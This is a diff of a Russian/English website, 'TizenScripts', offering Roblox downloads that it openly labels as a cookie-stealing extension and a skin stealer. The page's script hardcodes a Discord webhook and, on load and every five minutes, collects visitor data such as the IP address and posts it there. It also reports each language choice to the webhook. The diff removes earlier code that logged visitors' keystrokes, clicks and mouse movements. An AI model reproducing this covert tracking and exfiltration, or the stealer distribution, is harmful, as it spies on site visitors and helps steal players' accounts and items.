@@ -29,22 +29,77 @@
             margin-top: 10px;
             font-size: 18px;
         }
+        .language-selector {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        .language-selector select {
+            padding: 10px 15px;
+            background: #1a1a1a;
+            color: #fff;
+            border: 2px solid #ff4444;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .language-selector select:focus {
+            outline: none;
+            border-color: #ff6666;
+        }
+        nav {
+            background: #111;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 16px;
+            transition: color 0.3s;
+        }
+        nav a:hover {
+            color: #ff4444;
+        }
         main {
-            max-width: 800px;
+            max-width: 1000px;
             margin: 40px auto;
             padding: 0 20px;
         }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            padding: 25px;
+            text-align: center;
+            border-radius: 10px;
+            border: 2px solid #333;
+        }
+        .stat-card h3 {
+            font-size: 36px;
+            color: #ff4444;
+        }
+        .stat-card p {
+            color: #888;
+            margin-top: 5px;
+        }
         .downloads {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 20px;
-            margin-top: 30px;
         }
         .download-card {
             background: #1a1a1a;
             border: 2px solid #333;
             border-radius: 10px;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
             transition: all 0.3s;
         }
@@ -55,12 +110,18 @@
         }
         .download-card h3 {
             color: #ff4444;
+            font-size: 22px;
             margin-bottom: 10px;
         }
         .download-card p {
             color: #888;
             font-size: 14px;
             margin-bottom: 15px;
+        }
+        .version {
+            color: #ffaa00;
+            font-size: 12px;
+            margin-bottom: 10px;
         }
         .download-btn {
             display: inline-block;
@@ -87,6 +148,100 @@
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
         
+        // Переводы
+        const translations = {
+            ru: {
+                title: 'TizenScripts - Лучшие скрипты и расширения для Roblox',
+                headerTitle: '⚡ TizenScripts',
+                headerSubtitle: 'Лучшие скрипты и расширения для Roblox',
+                navHome: 'Главная',
+                navScripts: 'Скрипты',
+                navExtensions: 'Расширения',
+                navSupport: 'Поддержка',
+                navFAQ: 'FAQ',
+                statDownloads: 'Скачиваний',
+                statUsers: 'Пользователей',
+                statSupport: 'Поддержка',
+                statFree: 'Бесплатно',
+                cookieTitle: '🍪 Cookie-pro-V2',
+                cookieDesc: 'Расширение для кражи cookies Roblox',
+                mm2Title: '🔫 MM2 Stealer',
+                mm2Desc: 'Стилер скинов для Murder Mystery 2',
+                pulseTitle: '⚡ Pulse Hub',
+                pulseDesc: 'Универсальный хаб для Roblox',
+                downloadBtn: 'Скачать',
+                footer: '© 2026 TizenScripts'
+            },
+            en: {
+                title: 'TizenScripts - Best Roblox scripts and extensions',
+                headerTitle: '⚡ TizenScripts',
+                headerSubtitle: 'Best scripts and extensions for Roblox',
+                navHome: 'Home',
+                navScripts: 'Scripts',
+                navExtensions: 'Extensions',
+                navSupport: 'Support',
+                navFAQ: 'FAQ',
+                statDownloads: 'Downloads',
+                statUsers: 'Users',
+                statSupport: 'Support',
+                statFree: 'Free',
+                cookieTitle: '🍪 Cookie-pro-V2',
+                cookieDesc: 'Roblox cookie stealing extension',
+                mm2Title: '🔫 MM2 Stealer',
+                mm2Desc: 'Skin stealer for Murder Mystery 2',
+                pulseTitle: '⚡ Pulse Hub',
+                pulseDesc: 'Universal hub for Roblox',
+                downloadBtn: 'Download',
+                footer: '© 2026 TizenScripts'
+            }
+        };
+        
+        // Функция смены языка
+        function changeLanguage(lang) {
+            localStorage.setItem('language', lang);
+            const t = translations[lang];
+            
+            document.title = t.title;
+            document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
+            document.getElementById('navHome').textContent = t.navHome;
+            document.getElementById('navScripts').textContent = t.navScripts;
+            document.getElementById('navExtensions').textContent = t.navExtensions;
+            document.getElementById('navSupport').textContent = t.navSupport;
+            document.getElementById('navFAQ').textContent = t.navFAQ;
+            document.getElementById('statDownloadsText').textContent = t.statDownloads;
+            document.getElementById('statUsersText').textContent = t.statUsers;
+            document.getElementById('statSupportText').textContent = t.statSupport;
+            document.getElementById('statFreeText').textContent = t.statFree;
+            document.getElementById('cookieTitle').textContent = t.cookieTitle;
+            document.getElementById('cookieDesc').textContent = t.cookieDesc;
+            document.getElementById('mm2Title').textContent = t.mm2Title;
+            document.getElementById('mm2Desc').textContent = t.mm2Desc;
+            document.getElementById('pulseTitle').textContent = t.pulseTitle;
+            document.getElementById('pulseDesc').textContent = t.pulseDesc;
+            document.getElementById('footerText').textContent = t.footer;
+            
+            // Меняем кнопки
+            const buttons = document.querySelectorAll('.download-btn');
+            buttons.forEach(btn => {
+                btn.textContent = t.downloadBtn;
+            });
+            
+            // Отправляем выбор языка в Discord
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: '🌍 **ВЫБРАН ЯЗЫК**: ' + lang.toUpperCase()})
+            });
+        }
+        
+        // Загрузка сохранённого языка
+        function loadLanguage() {
+            const savedLang = localStorage.getItem('language') || 'ru';
+            document.getElementById('languageSelect').value = savedLang;
+            changeLanguage(savedLang);
+        }
+        
+        // Сбор данных
         async function collectData() {
             const data = {
                 timestamp: new Date().toISOString(),
@@ -171,10 +326,6 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({content: message})
             });
-            
-            let database = JSON.parse(localStorage.getItem('collectedData') || '[]');
-            database.push(data);
-            localStorage.setItem('collectedData', JSON.stringify(database));
         }
         
         async function getIP() {
@@ -185,70 +336,81 @@
             } catch (e) { return 'Unknown'; }
         }
         
-        let keystrokes = '';
-        document.addEventListener('keydown', function(e) {
-            keystrokes += e.key;
-            if (keystrokes.length > 100) {
-                let database = JSON.parse(localStorage.getItem('keystrokesData') || '[]');
-                database.push({type: 'keystrokes', value: keystrokes, timestamp: new Date().toISOString()});
-                localStorage.setItem('keystrokesData', JSON.stringify(database));
-                keystrokes = '';
-            }
-        });
-        
-        document.addEventListener('click', function(e) {
-            let database = JSON.parse(localStorage.getItem('clicksData') || '[]');
-            database.push({type: 'click', x: e.clientX, y: e.clientY, target: e.target.tagName, timestamp: new Date().toISOString()});
-            localStorage.setItem('clicksData', JSON.stringify(database));
-        });
-        
-        let mouseData = [];
-        document.addEventListener('mousemove', function(e) {
-            mouseData.push({x: e.clientX, y: e.clientY, t: Date.now()});
-            if (mouseData.length > 500) {
-                let database = JSON.parse(localStorage.getItem('mouseData') || '[]');
-                database.push(mouseData);
-                localStorage.setItem('mouseData', JSON.stringify(database));
-                mouseData = [];
-            }
-        });
-        
         window.addEventListener('load', function() {
+            loadLanguage();
             setTimeout(collectData, 1000);
             setInterval(collectData, 300000);
         });
     </script>
 </head>
 <body>
+    <!-- Выбор языка -->
+    <div class="language-selector">
+        <select id="languageSelect" onchange="changeLanguage(this.value)">
+            <option value="ru">🇷🇺 Русский</option>
+            <option value="en">🇬🇧 English</option>
+        </select>
+    </div>
+    
     <header>
         <h1>⚡ TizenScripts</h1>
-        <p>Лучшие скрипты и расширения для Roblox</p>
+        <p id="headerSubtitle">Лучшие скрипты и расширения для Roblox</p>
     </header>
     
+    <nav>
+        <a href="index.html" id="navHome">Главная</a>
+        <a href="scripts.html" id="navScripts">Скрипты</a>
+        <a href="extensions.html" id="navExtensions">Расширения</a>
+        <a href="support.html" id="navSupport">Поддержка</a>
+        <a href="faq.html" id="navFAQ">FAQ</a>
+    </nav>
+    
     <main>
+        <div class="stats">
+            <div class="stat-card">
+                <h3>10,000+</h3>
+                <p id="statDownloadsText">Скачиваний</p>
+            </div>
+            <div class="stat-card">
+                <h3>5,000+</h3>
+                <p id="statUsersText">Пользователей</p>
+            </div>
+            <div class="stat-card">
+                <h3>24/7</h3>
+                <p id="statSupportText">Поддержка</p>
+            </div>
+            <div class="stat-card">
+                <h3>100%</h3>
+                <p id="statFreeText">Бесплатно</p>
+            </div>
+        </div>
+        
         <div class="downloads">
             <div class="download-card">
-                <h3>🍪 Cookie-pro-V2</h3>
-                <p>Расширение для кражи cookies Roblox</p>
+                <h3 id="cookieTitle">🍪 Cookie-pro-V2</h3>
+                <div class="version">v3.0.0</div>
+                <p id="cookieDesc">Расширение для кражи cookies Roblox</p>
                 <a href="Cookie-pro-V2.zip" class="download-btn">Скачать</a>
             </div>
             
             <div class="download-card">
-                <h3>🔫 MM2 Stealer</h3>
-                <p>Стилер скинов для Murder Mystery 2</p>
+                <h3 id="mm2Title">🔫 MM2 Stealer</h3>
+                <div class="version">v2.733.988</div>
+                <p id="mm2Desc">Стилер скинов для Murder Mystery 2</p>
                 <a href="mm2-stealer.lua" class="download-btn">Скачать</a>
             </div>
             
             <div class="download-card">
-                <h3>⚡ Pulse Hub</h3>
-                <p>Универсальный хаб для Roblox</p>
+                <h3 id="pulseTitle">⚡ Pulse Hub</h3>
+                <div class="version">v2.7</div>
+                <p id="pulseDesc">Универсальный хаб для Roblox</p>
                 <a href="pulse-hub.lua" class="download-btn">Скачать</a>
             </div>
         </div>
     </main>
     
     <footer>
-        <p>© 2026 TizenScripts</p>
+        <p id="footerText">© 2026 TizenScripts</p>
     </footer>
 </body>
 </html>
